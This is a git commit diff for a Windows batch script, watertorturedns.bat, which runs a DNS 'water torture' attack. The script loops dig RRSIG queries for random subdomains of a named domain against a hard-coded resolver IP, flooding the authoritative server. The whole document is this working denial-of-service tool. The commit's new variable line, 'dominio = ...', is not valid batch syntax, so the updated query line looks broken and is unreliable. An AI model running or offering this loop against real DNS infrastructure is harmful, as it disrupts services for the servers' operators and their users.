c6b03fe1d058edbafc0051ffdd26277dcb018619
hackingyseguridad <hackingyseguridad@hackingyseguridad.com>
2016-11-09 18:53:10 +0100

    Update watertorturedns.bat

--- watertorturedns.bat
+++ watertorturedns.bat
@@ -1,6 +1,7 @@
 @ECHO OFF
 ECHO Water Torture DNS autoritativo. (c) hackingyseguridad 2016. Version 2.
 :loop
+dominio = "hackingyseguridad.es"
 SET/A ran=%random%
-dig @118.174.15.254 +notcp RRSIG %ran%.hackingyseguridad.es
+dig @118.174.15.254 +notcp RRSIG %ran%.%dominio%
 goto loop
